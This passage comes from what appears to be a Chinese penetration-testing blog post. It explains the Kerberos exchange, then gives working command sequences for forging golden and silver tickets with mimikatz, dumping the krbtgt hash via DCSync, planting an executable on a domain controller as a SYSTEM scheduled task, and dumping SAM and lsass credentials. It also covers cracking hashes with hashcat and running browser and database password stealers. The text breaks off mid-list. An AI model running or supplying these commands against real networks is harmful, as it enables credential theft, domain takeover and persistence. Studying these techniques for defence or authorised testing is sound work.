获得服务授予票据（Ticket）。由于客户端是第一次访问 KDC，此时 KDC 也不确定该客户端的身份，所以第一次通信的目的为 KDC 认证客户端身份，确认客户端是一个可靠且拥有访问 KDC 权限的客户端，</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221205144558462.png\" alt=\"image-20221205144558462\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、客户端用户向KDC以明文的方式发起请求。该次请求中携带了自己的用户名，主机IP，和当前时间戳；</span><br><span class=\"line\">2、KDC当中的AS（Authentication Server）接收请求（AS是KDC中专门用来认证客户端身份的认证服务器）后去kerberos认证数据库中根据用户名查找是否存在该用户，此时只会查找是否有相同用户名的用户，并不会判断身份的可靠性；</span><br><span class=\"line\">3、如果没有该用户名，认证失败，服务结束；如果存在该用户名，则AS认证中心便认为用户存在，此时便会返回响应给客户端，其中包含两部分内容：</span><br><span class=\"line\">3.1、第一部分内容称为TGT，他叫做票据授予票据，客户端需要使用TGT去KDC中的TGS（票据授予中心）获取访问网络服务所需的Ticket（服务授予票据），TGT中包含的内容有kerberos数据库中存在的该客户端的Name，IP，当前时间戳，客户端即将访问的TGS的Name，TGT的有效时间以及一把用于客户端和TGS间进行通信的Session_key(CT_SK)。整个TGT使用TGS密钥加密，客户端是解密不了的，由于密钥从没有在网络中传输过，所以也不存在密钥被劫持破解的情况。</span><br><span class=\"line\">3.2第二部分内容是使用客户端密钥加密的一段内容，其中包括用于客户端和TGS间通信的Session_key(CT_SK),客户端即将访问的TGS的Name以及TGT的有效时间，和一个当前时间戳。该部分内容使用客户端密钥加密，所以客户端在拿到该部分内容时可以通过自己的密钥解密。如果是一个假的客户端，那么他是不会拥有真正客户端的密钥的，因为该密钥也从没在网络中进行传输过。这也同时认证了客户端的身份，如果是假客户端会由于解密失败从而终端认证流程。至此，第一次通信完成。</span><br></pre></td></tr></table></figure>\n<p><strong>通信第二步客户端和 TGS 进行通信</strong></p>\n<p>此时的客户端收到了来自 KDC（其实是 AS）的响应，并获取到了其中的两部分内容。此时客户端会用自己的密钥将第二部分内容进行解密，分别获得时间戳，自己将要访问的 TGS 的信息，和用于与 TGS 通信时的密钥 CT_SK。首先他会根据时间戳判断该时间戳与自己发送请求时的时间之间的差值是否大于 5 分钟，如果大于五分钟则认为该 AS 是伪造的，认证至此失败。如果时间戳合理，客户端便准备向 TGS 发起请求</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221205145435423.png\" alt=\"image-20221205145435423\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">客户端行为：</span><br><span class=\"line\">1、客户端使用CT_SK加密将自己的客户端信息发送给KDC，其中包括客户端名，IP，时间戳；</span><br><span class=\"line\">2、客户端将自己想要访问的Server服务以明文的方式发送给KDC；</span><br><span class=\"line\">3、客户端将使用TGS密钥加密的TGT也原封不动的也携带给KDC；</span><br><span class=\"line\">TGS行为：</span><br><span class=\"line\">1、此时KDC中的TGS（票据授予服务器）收到了来自客户端的请求。他首先根据客户端明文传输过来的Server服务IP查看当前kerberos系统中是否存在可以被用户访问的该服务。如果不存在，认证失败结束，。如果存在，继续接下来的认证。</span><br><span class=\"line\">2、TGS使用自己的密钥将TGT中的内容进行解密，此时他看到了经过AS认证过后并记录的用户信息，一把Session_KEY即CT_SK，还有时间戳信息，他会现根据时间戳判断此次通信是否真是可靠有无超出时延。</span><br><span class=\"line\">3、如果时延正常，则TGS会使用CT_SK对客户端的第一部分内容进行解密（使用CT_SK加密的客户端信息），取出其中的用户信息和TGT中的用户信息进行比对，如果全部相同则认为客户端身份正确，方可继续进行下一步。</span><br><span class=\"line\">4、此时KDC将返回响应给客户端，响应内容包括：</span><br><span class=\"line\">第一部分：用于客户端访问网络服务的使用Server密码加密的ST（Servre Ticket），其中包括客户端的Name，IP，需要访问的网络服务的地址Server IP，ST的有效时间，时间戳以及用于客户端和服务端之间通信CS_SK（SessionKey）。</span><br><span class=\"line\">第二部分：使用CT_SK加密的内容，其中包括CS_SK和时间戳，还有ST的有效时间。由于在第一次通信的过程中，AS已将CT_SK通过客户端密码加密交给了客户端，且客户端解密并缓存了CT_SK，所以该部分内容在客户端接收到时是可以自己解密的。</span><br><span class=\"line\">至此，第二次通信完成。</span><br></pre></td></tr></table></figure>\n<p><strong>通信第三步客户端和服务端进行通信</strong></p>\n<p>此时的客户端收到了来自 KDC（TGS）的响应，并使用缓存在本地的 CT_SK 解密了第二部分内容（第一部分内容中的 ST 是由 Server 密码加密的，客户端无法解密），检查时间戳无误后取出其中的 CS_SK 准备向服务端发起最后的请求。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221205150740295.png\" alt=\"image-20221205150740295\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">客户端：</span><br><span class=\"line\">1、客户端使用CS_SK将自己的主机信息和时间戳进行加密作为交给服务端的第一部分内容，然后将ST（服务授予票据）作为第二部分内容都发送给服务端。</span><br><span class=\"line\">服务端：</span><br><span class=\"line\">1、服务器此时收到了来自客户端的请求，他会使用自己的密钥，即Server密钥将客户端第二部分内容进行解密，核对时间戳之后将其中的CS_SK取出，使用CS_SK将客户端发来的第一部分内容进行解密，从而获得经过TGS认证过后的客户端信息，此时他将这部分信息和客户端第二部分内容带来的自己的信息进行比对，最终确认该客户端就是经过了KDC认证的具有真实身份的客户端，是他可以提供服务的客户端。此时服务端返回一段使用CT_SK加密的表示接收请求的响应给客户端，在客户端收到请求之后，使用缓存在本地的CS_ST解密之后也确定了服务端的身份（其实服务端在通信的过程中还会使用数字证书证明自己身份）。</span><br><span class=\"line\">至此，第三次通信完成。此时也代表着整个kerberos认证的完成，通信的双方都确认了对方的身份，此时便可以放心的</span><br><span class=\"line\">进行整个网络通信了。</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221205151142934.png\" alt=\"image-20221205151142934\"></p>\n<h3 id=\"黄金票据\"><a class=\"markdownIt-Anchor\" href=\"#黄金票据\">#</a> 黄金票据</h3>\n<p><strong>权限维持的技术！！</strong></p>\n<p>krbtgt 用户，是系统在创建域时自动生成的一个帐号，其作用是密钥分发中心的服务账号，其密码是系统随机生成的，无法登录主机</p>\n<p>TGT=Krbtgt 的 html hash 加密</p>\n<p>1、Kerberos 中的 TGT 和 Logon Session Key（CT_SK）是 AS 返回的 ，TGP 它是由 Krbtgt 加密和签名的，krbtgt 的 NTLM Hash 又是固定的，而 CT_SK 并不会保存在 KDC 中。</p>\n<p>2、所以只要得到 krbtgt 的 NTLM Hash，就可以伪造 TGT 和 Logon Session Key（CT_SK）。</p>\n<p>3、Client 与 TGS 的交互中，而已有了金票后（TGT）, 就跳过 AS 验证，不用验证账户和密码，所以也不担心域管密码修改。</p>\n<p>当我们获得域控的控制权限后，有可能获取域内所有用户的 hash，和 krbtgt 的 hash。这时，由于一些原因导致我们失去对目标的控制权，但是我们还留有一个普通用户的权限，并且 krbtgt 的密码没有更改，此时我们可以利用 krbtgt 用户的 ntlm hash 制作黄金票据伪造 TGT，重新获取域控的管理权限。</p>\n<p>实现前提</p>\n<p>1、已经控制了域名并且使用域管理员登录或者提权的 system</p>\n<p>如果域管理员发现了你控制了域控机器，把你的后门删除了，那么就不能继续控制域控了，这个时候当我们可以伪</p>\n<p>造 TGT 重新获得域控的权限</p>\n<p>条件：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、域名称</span><br><span class=\"line\">2、域的SID值</span><br><span class=\"line\">3、域的KRBTGT账号的HASH</span><br><span class=\"line\">4、伪造任意用户名</span><br><span class=\"line\">（获取域的SID和KRBTGT账号的NTLM HASH的前提是需要已经拿到了域的权限）</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell whoami /user 获取域的sid值(去掉最后的‐500，500表示为administrator用户)</span><br><span class=\"line\">shell net config workstation 查看域</span><br></pre></td></tr></table></figure>\n<p>3、使用 mimikatz 导出 KRBTGT 的 ntlm hash</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz lsadump::dcsync /domain:hack.com /user:krbtgt</span><br></pre></td></tr></table></figure>\n<p>因为之前已经记录了关键信息，我们现在就可以伪造任意用户访问域控，windows 2008 机器必须是域内用户或者 system 用户</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz kerberos::tgt 查票</span><br><span class=\"line\">mimikatz kerberos::purge 清票</span><br></pre></td></tr></table></figure>\n<p>使用计划任务上线 cs</p>\n<p>copy 恶意文件到域控</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell copy c:\\users\\administrator\\desktop\\artifact.exe \\\\dc.hack.com\\c$</span><br></pre></td></tr></table></figure>\n<p>设置计划任务到域控</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell schtasks /create /s dc.hack.com /tn test /sc onstart /tr c:\\artifact.exe /ru system /f</span><br><span class=\"line\"></span><br><span class=\"line\">shell schtasks /run /s dc.hack.com /i /tn &quot;test&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"白银票据\"><a class=\"markdownIt-Anchor\" href=\"#白银票据\">#</a> 白银票据</h3>\n<p>服务账号就是计算机名字 +$ 用来管理服务的账号</p>\n<p>如果说黄金票据是伪造的 TGT, 那么白银票据就是伪造的 ST。 在 Kerberos 认证的第三部，Client 带着 ST 和 Authenticator3 向 Server 上的某个服务进行请求，Server 接收到 Client 的请求之后，通过自己的 Master Key 解密 ST, 从而获得 Session Key。通过 Session Key 解密 Authenticator3, 进而验证对方的身份，验证成功就让 Client 访问 server 上的指定服务了。所以我们只需要知道 Server 用户的 Hash 就可以伪造出一个 ST, 且不会经过 KDC, 但是伪造的门票只对部分服务起作用。</p>\n<p>条件如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.域名</span><br><span class=\"line\">2.域sid</span><br><span class=\"line\">3.目标服务器名</span><br><span class=\"line\">4.可利用的服务</span><br><span class=\"line\">5.服务账号的NTML HASH</span><br><span class=\"line\">6.需要伪造的用户名</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221205180237718.png\" alt=\"image-20221205180237718\"></p>\n<p>3、伪造票据（CIFS 共享服务）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz sekurlsa::logonpasswords</span><br><span class=\"line\">mimikatz kerberos::tgt 查票</span><br><span class=\"line\">mimikatz kerberos::purge 清票</span><br><span class=\"line\">shell klist 查票</span><br><span class=\"line\">shell klist purge 清票</span><br><span class=\"line\">mimikatz kerberos::golden /domain:hack.com /sid:S‐1‐5‐21‐2716900768‐72748719‐3475352185 /target:dc.hack.com /service:cifs /rc4:26a703eba507e848825615316bc880a1 /user:abcd /ptt</span><br><span class=\"line\">mimikatz kerberos::golden /domain:hack.com /sid:S‐1‐5‐21‐2716900768‐72748719‐3475352185 /target:dc.hack.com /service:LDAP /rc4:26a703eba507e848825615316bc880a1 /user:abcd /ptt</span><br><span class=\"line\">mimikatz lsadump::dcsync /dc:dc.hack.com /domain:hack.com /user:krbtgt</span><br></pre></td></tr></table></figure>\n<h3 id=\"sam文件密码抓取\"><a class=\"markdownIt-Anchor\" href=\"#sam文件密码抓取\">#</a> SAM 文件密码抓取</h3>\n<p>本地密码：</p>\n<p>1. 读 SAM 文件 (密文)</p>\n<p>2. 读 lsass 进程（明文）</p>\n<p><strong>Mimikatz 介绍</strong></p>\n<p>Mimikatz 是法国人 benjamin 开发的一款功能强大的轻量级调试工具，但由于其功能强大，能够直接读取 WindowsXP-2012 等操作系统的明文密码而闻名于渗透测试，可以说是渗透必备工具，mimikatz 可以从内存中提取明文密码、哈希、PIN 码和 kerberos 票证。 mimikatz 还可以执行哈希传递、票证传递或构建黄金票证</p>\n<p>几个常用的模块</p>\n<p>sekurlsa 模块</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">privilege模块</span><br><span class=\"line\">privilege::debug 提升为debug权限</span><br><span class=\"line\">sekurlsa：模块，从lsass进程中提取passwords、keys、pin、tickets等信息</span><br><span class=\"line\">sekurlsa::msv 获取HASH (LM,NTLM)</span><br><span class=\"line\">sekurlsa::wdigest 通过可逆的方式去内存中读取明文密码</span><br><span class=\"line\">sekurlsa::Kerberos 假如域管理员正好在登陆了我们的电脑，我们可以通过这个命令来获取域管理员的明文密码</span><br><span class=\"line\">sekurlsa::tspkg 通过tspkg读取明文密码</span><br><span class=\"line\">sekurlsa::livessp 通过livessp 读取明文密码</span><br><span class=\"line\">sekurlsa::ssp 通过ssp 读取明文密码</span><br><span class=\"line\">sekurlsa::logonPasswords 通过以上各种方法读取明文密码</span><br><span class=\"line\">sekurlsa::process 将自己的进程切换到lsass进程中，之前只是注入读取信息</span><br><span class=\"line\">sekurlsa::minidump file 这个模块可以读取已经打包的内存信息</span><br><span class=\"line\">sekurlsa::pth 哈希传递</span><br><span class=\"line\">sekurlsa::pth /user:administrator/domain:host1 /ntlm:cdf34cda4e455232323xxxx</span><br><span class=\"line\">sekurlsa::pth /user:administrator/domain:host1 /aes256:cdf34cda4e455232323xxxx</span><br></pre></td></tr></table></figure>\n<p>cs 中执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords&quot; &quot;exit&quot; &gt; 1.txt</span><br></pre></td></tr></table></figure>\n<p>或者 cs 中有内置 mimikatz 直接执行 logonPasswords</p>\n<p>process 模块</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">process::list 列出进程列表</span><br><span class=\"line\">process::exports 导出进程列表</span><br><span class=\"line\">process::imports 导入列表</span><br><span class=\"line\">process::start 开始一个进程</span><br><span class=\"line\">process::stop 停止一个程序</span><br><span class=\"line\">process::suspend 冻结一个进程</span><br><span class=\"line\">process::resume 从冻结中恢复</span><br><span class=\"line\">process::run notepad 运行一个程序</span><br><span class=\"line\">process::runp 以SYSTEM系统权限打开一个新的mimikatz窗口</span><br></pre></td></tr></table></figure>\n<p>kerberos 模块</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kerberos::list 列出系统中的票据</span><br><span class=\"line\">kerberos::tgt 清除系统中的票据</span><br><span class=\"line\">kerberos::purge 导入票据到系统中</span><br><span class=\"line\">kerberos::ptc 票据路径</span><br></pre></td></tr></table></figure>\n<p>常用命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CRYPTO::Certificates – 列出/导出凭证。</span><br><span class=\"line\">KERBEROS::Golden – 创建黄金票证/白银票证/信任票证。</span><br><span class=\"line\">KERBEROS::List – 列出在用户的内存中所有用户的票证（TGT 和 TGS）。</span><br><span class=\"line\">KERBEROS::PTT – 票证传递。</span><br><span class=\"line\">LSADUMP::DCSync – 向 DC 发起同步一个对象（获取帐户的密码数据）的质询。</span><br><span class=\"line\">LSADUMP::LSA – 向 LSA Server 质询检索 SAM/AD 的数据（正常或未打补丁的情况下）。可以从 DC 或者是一个lsass.dmp的转储文件中导出所有的Active Directory 域凭证数据。同样也可以获取指定帐户的凭证，如 krbtgt 帐户，使用 /name 参数，如：“/name:krbtgt”。</span><br><span class=\"line\">LSADUMP::SAM ‐ 获取 SysKey 来解密 SAM 的项目数据（从注册表或者 hive 中导出）SAM 选项。可以连接到本地安全帐户管理器（SAM）数据库中并能转储本地帐户的凭证。可以用来转储在 Windows 计算机上的所有的本地凭据。</span><br><span class=\"line\">LSADUMP::Trust ‐ 向 LSA Server 质询来获取信任的认证信息（正常或未打补丁的情况下）为所有相关的受信的域或林转储信任密钥（密码）</span><br><span class=\"line\">MISC::AddSid – 将用户帐户添加到 SID 历史记录。第一个值是目标帐户，第二值是帐户/组名（可以是多个或 SID）。</span><br><span class=\"line\">MISC::MemSSP – 注入恶意的 Wndows SSP 来记录本地身份验证凭据。</span><br><span class=\"line\">MISC::Skeleton – 在 DC 中注入万能钥匙（Skeleton Key） 到 LSASS 进程中。这使得所有用户所。使用的万能钥匙修补 DC 使用 “主密码” （又名万能钥匙）以及他们自己通常使用的密码进行身份验证。</span><br><span class=\"line\">PRIVILEGE::Debug – 获得 Debug 权限（很多 Mimikatz 命令需要 Debug 权限或本地 SYSTEM 权限）。</span><br><span class=\"line\">SEKURLSA::Ekeys – 列出 Kerberos 密钥</span><br><span class=\"line\">SEKURLSA::Kerberos – 列出所有已通过认证的用户的 Kerberos 凭证（包括服务帐户和计算机帐户）。</span><br><span class=\"line\">SEKURLSA::Krbtgt – 获取域中 Kerberos 服务帐户（KRBTGT）的密码数据。</span><br><span class=\"line\">SEKURLSA::LogonPasswords – 列出所有可用的提供者的凭据。这个命令通常会显示最近登录过的用户和最近登录过的计算机的凭证。</span><br><span class=\"line\">SEKURLSA::Pth – Hash 传递 和 Key 传递（注：Over‐Pass‐the‐Hash 的实际过程就是传递了相关的 Key(s)）。</span><br><span class=\"line\">SEKURLSA::Tickets – 列出最近所有已经过身份验证的用户的可用的 Kerberos 票证，包括使用用户帐户的上下文运行的服务和本地计算机在AD 中的计算机帐户。与 kerberos::list 不同的是 sekurlsa 使用内存读取的方式，它不会受到密钥导出的限制。</span><br><span class=\"line\">TOKEN::List – 列出系统中的所有令牌。</span><br><span class=\"line\">TOKEN::Elevate – 假冒令牌。用于提升权限至 SYSTEM 权限（默认情况下）或者是发现计算机中的域管理员的令牌。</span><br><span class=\"line\">TOKEN::Elevate /domainadmin – 假冒一个拥有域管理员凭证的令牌。</span><br></pre></td></tr></table></figure>\n<h4 id=\"sam文件抓取密码\"><a class=\"markdownIt-Anchor\" href=\"#sam文件抓取密码\">#</a> SAM 文件抓取密码</h4>\n<p><strong>导出 sam 和 system 文件</strong></p>\n<p>1. 通过 reg 命令无工具导出</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">reg save hklm\\sam sam.hive</span><br><span class=\"line\">reg save hklm\\system system.hive</span><br></pre></td></tr></table></figure>\n<p>2、通过 nishang 中的 Copy-VSS 进行复制，如果这个脚本运行在了 DC 服务器上，ntds.dit 和 SYSTEM hive 也能被拷贝出来 (或者 cs 也行)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">copy‐vss //直接将文件保存在当前目录下</span><br><span class=\"line\">copy‐vss ‐DestinationDir 路径 //指定保存文件的路径（必须是已经存在的路径）</span><br></pre></td></tr></table></figure>\n<p>3.<strong> 读取 sam 和 system 文件获取密码</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lsadump::sam /sam:sam.hive /system:system.hive</span><br></pre></td></tr></table></figure>\n<h4 id=\"在线读取samlsass文件\"><a class=\"markdownIt-Anchor\" href=\"#在线读取samlsass文件\">#</a> 在线读取 sam,lsass 文件</h4>\n<p>使用 mimikatz 在线读取 sam 文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">分开的命令如下</span><br><span class=\"line\">privilege::debug</span><br><span class=\"line\">token:elevate</span><br><span class=\"line\">lsadump::sam</span><br><span class=\"line\">连起来</span><br><span class=\"line\">mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>\n<p>在线读取 lassa 文件</p>\n<p>从 lsass 进程中提取 passwords、keys、pin、tickets 等信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">privilege::debug</span><br><span class=\"line\">sekurlsa::msv 获取HASH (LM,NTLM)</span><br><span class=\"line\">sekurlsa::wdigest 通过可逆的方式去内存中读取明文密码</span><br><span class=\"line\">sekurlsa::Kerberos 假如域管理员正好在登陆了我们的电脑，我们可以通过这个命令来获取域管理员的明文密码</span><br><span class=\"line\">sekurlsa::tspkg 通过tspkg读取明文密码</span><br><span class=\"line\">sekurlsa::livessp 通过livessp 读取明文密码</span><br><span class=\"line\">sekurlsa::ssp 通过ssp 读取明文密码</span><br><span class=\"line\">sekurlsa::logonPasswords 通过以上各种方法读取明文密码</span><br></pre></td></tr></table></figure>\n<h4 id=\"离线读取\"><a class=\"markdownIt-Anchor\" href=\"#离线读取\">#</a> 离线读取</h4>\n<p>1. 导出 lsass 文件</p>\n<p>1、使用任务管理器导出（windows NT 6）需要有远程桌面</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221206170800142.png\" alt=\"image-20221206170800142\"></p>\n<p>2. 使用 procdump 导出 lsass.dmp 文件</p>\n<p>ProcDump 是一个命令行实用工具，其主要用途是在管理员或开发人员可用于确定峰值原因的峰值期间监视 CPU 峰值和生成故障转储的应用程序。 ProcDump 还包括使用窗口挂起 (使用相同的窗口挂起定义，Windows 任务管理器使用) 、未经处理的异常监视，并且可以根据系统性能计数器的值生成转储。 它还可用作可在其他脚本中嵌入的常规进程转储实用工具。因为是微软的所以一般不会被杀软杀掉</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">procdump.exe ‐accepteula ‐ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>\n<p>3. 使用 PowerSploit 的 Out-MiniDump 模块，PowerSploit 是一个基于 Powershell 的渗透工具包，可以选择创建进程的完整内存转储。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1Bvd2VyU2hlbGxNYWZpYS9Qb3dlclNwbG9pdC9ibG9iL21hc3Rlci9FeGZpbHRyYXRpb24vT3V0LU1pbmlkdW1wLnBzMQ==\">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1</span></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221206171322063.png\" alt=\"image-20221206171322063\"></p>\n<p>4.comsvcs.dll，系统自带。通过 comsvcs.dll 的导出函数 MiniDump 实现 dump 内存</p>\n<p>首先查看 lsass.exe 进程 PID: tasklist | findstr lsass.exe</p>\n<p>使用 powershell 导出 rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 488 C:\\lsass.dmp full</p>\n<p>读取 dump 文件</p>\n<p>mimikatz.exe “sekurlsa::minidump lsass.dmp” “sekurlsa::logonPasswords full”</p>\n<h3 id=\"使用hashcat\"><a class=\"markdownIt-Anchor\" href=\"#使用hashcat\">#</a> 使用 hashcat</h3>\n<p>Hashcat 是一个密码恢复工具。直到 2015 年，它都有一个专有的代码库，但随后作为开源软件发布。版本适用于 Linux、OS X 和 Windows。哈希卡支持的哈希算法的示例包括 LM 哈希、MD4、MD5、SHA 系列和 Unix Crypt 格式，以及 MySQL 和 Cisco PIX 中使用的算法。</p>\n<p>下载地址： <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYXNoY2F0Lm5ldC9oYXNoY2F0Lw==\">https://hashcat.net/hashcat/</span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hashcat ‐m 1000 NTLM HASH 字典 ‐‐force</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2NtZDUuY29t\">cmd5.com</span></p>\n<h3 id=\"浏览器-数据库等其他密码的抓取\"><a class=\"markdownIt-Anchor\" href=\"#浏览器-数据库等其他密码的抓取\">#</a> <strong>浏览器、数据库等其他密码的抓取</strong></h3>\n<p><strong>BrowserGhost 浏览器抓取</strong></p>\n<p>这是一个抓取浏览器密码的工具，后续会添加更多功能，已经完成的功能如下：实现 system 抓机器上其他用户的浏览器密码 (方便横向移动时快速凭据采集)</p>\n<p>用.net2 实现可兼容大部分 windows，并去掉依赖 (不需要 System.Data.SQLite.dll 这些累赘) 可以解密 chrome 全版本密码 (chrome80 版本后加密方式变了)</p>\n<p>Chrome 已经可以获取 login data、cookie、history、book 了</p>\n<p>BrowserGhost.exe</p>\n<p><strong>Sharp-HackBrowserData 浏览器</strong></p>\n<p>Sharp-HackBrowserData ，谷歌、火狐、IE、Vivaldi 等常见的浏览器都能抓</p>\n<p>Sharp-HackBrowserData.exe</p>\n<p><strong>SharpDecryptPwd 数据库</strong></p>\n<p>SharpDecryptPwd-master 对密码已保存在 Windwos 系统上的部分程序进行解析，包 Navicat,TeamViewer,FileZilla,WinSCP,Xmangager 系列产品</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SharpDecryptPwd.exe ‐TeamViewer</span><br><span class=\"line\">SharpDecryptPwd.exe ‐FileZilla</span><br><span class=\"line\">SharpDecryptPwd.exe ‐WinSCP</span><br><span class=\"line\">SharpDecryptPwd.exe ‐Xmangager ‐p Session_Path</span><br></pre></td></tr></table></figure>\n<p><strong>LaZagne 